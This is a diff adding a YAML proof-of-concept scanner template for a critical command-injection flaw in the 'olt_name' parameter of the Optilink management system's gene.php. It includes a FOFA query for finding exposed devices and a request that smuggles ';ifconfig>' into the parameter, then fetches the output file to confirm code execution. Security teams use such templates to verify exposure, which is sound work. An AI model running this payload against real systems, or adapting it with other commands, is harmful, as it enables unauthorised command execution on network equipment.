@@ -1,0 +1,20 @@
+id: poc-yaml-optilink-ms-olt-name-command-injection
+info:
+  name: Optilink 管理系统 olt_name 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: Optilink 管理系统
+  fofa: body="/html/css/dxtdata.css" && title="login"
+variables:
+  random: random_str(5)
+requests:
+- method: GET
+  path: /cgi/fsystem/gene.php?olt_op=1&olt_name=;ifconfig%3E%20{{.random}}.txt;%20%23%20
+  expression: status_code == 200 && contains(body,"Fatal error") && contains(body,"Call
+    to undefined function snmp_get()")
+- method: GET
+  path: /cgi/fsystem/{{.random}}.txt
+  expression: status_code == 200 && contains(body,"Link encap:Ethernet") && contains(body,"HWaddr")
+    && contains(body,"Mask:")
+transport: http
